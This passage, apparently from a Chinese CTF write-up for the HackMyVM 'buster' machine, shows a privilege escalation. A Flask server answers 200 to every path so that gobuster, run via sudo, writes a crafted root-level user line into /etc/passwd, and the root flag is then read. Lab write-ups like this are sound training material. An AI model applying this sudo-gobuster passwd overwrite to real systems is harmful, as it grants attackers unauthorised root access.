\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e例如：我们先创建字典文件\u003ccode\u003ewordlist\u003c/code\u003e ，里面写入\u003ccode\u003ehello\u003c/code\u003e 。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e wordlist \nhello\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003ekali\u003c/code\u003e创建\u003ccode\u003ehello\u003c/code\u003e文件，并创建简易web服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nhello\n\n┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# php -S 0:81\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过\u003ccode\u003egobuster\u003c/code\u003e扫描\u003ccode\u003ekali\u003c/code\u003e 将输出结果放入到\u003ccode\u003etest\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e这样就可以将文字输入带文字了，假如我们将其输入到\u003ccode\u003e/etc/passwd\u003c/code\u003e文件呢？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ gobuster -u http://192.168.56.4:81/ -w wordlist -n -q -o \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e\n/hello\nwelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e\n/hello\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们打算计划向\u003ccode\u003e/etc/passwd\u003c/code\u003e写入\u003ccode\u003ehack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\u003c/code\u003e （长度为\u003ccode\u003e40\u003c/code\u003e） 但是因为会触发交换文件。\u003c/p\u003e\n\u003cp\u003e所以打算创建\u003ccode\u003eweb\u003c/code\u003e服务器，将接收到路径长度\u003ccode\u003e≠40\u003c/code\u003e的数据包都返回\u003ccode\u003e200\u003c/code\u003e ，那么就会输出中写出来\u003c/p\u003e\n\u003cp\u003e(代码参照：\u003ca href=\"https://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83\"\u003ehttps://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83\u003c/a\u003e)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom flask import Flask, Response\n\napp = Flask(__name__)\n\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, defaults={\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e})\n\u003cspan class=\"hljs-comment\"\u003e# 接收所有路径\u003c/span\u003e\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/\u0026#x3C;path:path\u003e'\u003c/span\u003e)\n\u003cspan class=\"hljs-comment\"\u003e# catch_all 处理所有请求\u003c/span\u003e\ndef catch_all(path):\n\t\t\u003cspan class=\"hljs-comment\"\u003e# 参数path是从url中提取的路径\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e len(path) == 1:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Response(status=404)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Response(status=200)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    app.run(host=\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e, port=81) \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e启动服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# python3 a.py\n * Serving Flask app \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e\n * Debug mode: off\nWARNING: This is a development server. Do not use it \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:81\nPress CTRL+C to quit\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e靶机在字典中写入\u003ccode\u003ehack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\u003c/code\u003e ，并使用\u003ccode\u003egobuster\u003c/code\u003e将其写入\u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\"\u003c/span\u003e \u003e wordlist\nwelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/gobuster -w wordlist -u http://192.168.56.4:81/ -n -q -fw -o /etc/passwd                                                  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换到到\u003ccode\u003e/hack\u003c/code\u003e用户，密码\u003ccode\u003e123456\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/hack@listen:/tmp# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(/hack) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eRootFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/hack@listen:/root# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e R00t_fl4g_is_HHHHerererererrererere.txt \nb6a1a0de4223ba038327fc9c647701fb\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e更加熟练对\u003ccode\u003ewpscan\u003c/code\u003e的使用，以及学到如何使用\u003ccode\u003egobuster\u003c/code\u003e提权，如何使用\u003ccode\u003eflask\u003c/code\u003e搭建简易服务器\u003c/p\u003e","title":"HackMyVM - buster","date":"2025-02-20","updated":"2025-02-20","comments":true,"tags":["Linux靶机","HackMyVM"],"categories":"靶机","description":"buster. https://hackmyvm.eu/machines/machine.php?vm=buster Notes: Wish you have fun. 前期踩点 nmap扫描，24是靶机 可以看到是搭建了WordPress6.7.1 访问主页，并查看指纹识别。和扫描的一样是Word..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMbuster"},"buildId":"w5CAf1BA6WXI2gBvWdfre","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>